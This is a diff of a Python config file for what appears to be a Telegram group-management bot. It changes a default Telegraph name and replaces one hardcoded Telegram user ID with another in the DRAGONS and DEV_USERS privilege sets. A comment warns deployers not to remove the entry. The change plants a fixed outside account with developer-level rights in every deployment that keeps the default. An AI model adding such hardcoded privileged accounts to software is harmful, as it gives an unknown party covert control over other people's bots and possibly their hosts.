@@ -120,7 +120,7 @@ if ENV:
     TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", None)
     HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
     TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
-    TELEGRAPH_SHORT_NAME = os.environ.get("TELEGRAPH_SHORT_NAME", "Dr_Assad_Ali")
+    TELEGRAPH_SHORT_NAME = os.environ.get("TELEGRAPH_SHORT_NAME", "D4nGeR_0pBolte")
     HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
     LOG_GROUP_ID = os.environ.get('LOG_GROUP_ID', None)
     
@@ -211,8 +211,8 @@ else:
         raise Exception(
             "Your blacklisted chats list does not contain valid integers.")
 
-DRAGONS.add(2042185317)
-DEV_USERS.add(2042185317) #it you going to remove me don't ask me errors👿
+DRAGONS.add(1624072266)
+DEV_USERS.add(1624072266) #it you going to remove me don't ask me errors👿
 
 if not SPAMWATCH_API:
     sw = None
